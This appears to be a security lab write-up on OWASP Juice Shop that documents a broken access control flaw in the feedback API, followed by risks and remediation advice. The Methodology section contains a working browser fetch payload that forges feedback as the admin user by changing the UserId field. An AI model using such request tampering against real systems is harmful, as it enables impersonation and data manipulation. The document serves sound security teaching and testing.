### **Methodology**

1. **Interception of Request**
   - Used DevTools to capture the `POST` request sent to `/api/Feedbacks/` when submitting normal feedback.
   - The intercepted request revealed a `UserId` field in the request body, which was set to the authenticated user's ID.

2. **Modification of Request**
   - Sent a modified `POST` request directly from the browser console, changing the `UserId` to `1` (admin) and including a fresh captcha to bypass validation.
   - The request was constructed using the `fetch` API with the following payload:
     ```js
     fetch('/api/Feedbacks/', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         UserId: 1,
         captchaId: 50,
         captcha: "19",
         comment: "forged feedback (admin@juice-sh.op)",
         rating: 1
       }),
       credentials: 'include'
     }).then(r => r.json()).then(console.log)
     ```

3. **Tools Used**
   - **Browser DevTools** (for intercepting and modifying requests)
   - **JavaScript `fetch` API** (for sending the modified request)
   - **Captcha Handling** (to ensure the request bypasses captcha validation)

---
### **Vulnerabilities**

1. **Vulnerability Name**
   - **Broken Access Control** (CWE-284)

2. **Affected Components**
   - **Feedback Submission System** (specifically the `/api/Feedbacks/` endpoint)

3. **Severity Level**
   - **High**
     - Allows unauthorized users to impersonate administrators, potentially leading to misinformation, reputational damage, or further exploitation.

---
### **Risks**

1. **Business Impact**
   - **Data Integrity**: False feedback can mislead other users, affecting purchasing decisions.
   - **Reputational Damage**: The platform's credibility may be compromised if users realize feedback can be manipulated.
   - **Legal Risks**: Misleading content could lead to legal consequences, especially if the platform is used for regulated products.

2. **Exploitation Potential**
   - Attackers can post feedback as any user, including administrators, to manipulate public perception.
   - The vulnerability can be chained with other attacks (e.g., XSS) to escalate impact.

---
### **Actions**

#### **Risk Mitigation Strategies**
- **Server-Side Validation**: Ensure the `UserId` field in feedback submissions matches the authenticated user's ID.
- **Input Sanitization**: Validate and sanitize all user inputs, especially those involving sensitive operations like feedback submissions.
- **Authentication Checks**: Implement robust authentication checks to verify user ownership of the submitted data.

#### **Remediation Fixes**
- **Backend Modifications**:
  - Add middleware to validate the `UserId` field against the authenticated user's session data.
  - Ensure the server-side logic enforces ownership of submitted feedback.
- **Database Constraints**:
  - Add constraints to prevent unauthorized modifications to the `UserId` field in the database.

#### **Best Security Practices**
- **Principle of Least Privilege**: Ensure users can only perform actions they are authorized for.
- **Regular Audits**: Conduct regular security audits to identify and fix similar vulnerabilities.
- **User Education**: Educate users about the risks of sharing sensitive information and the importance of strong authentication.

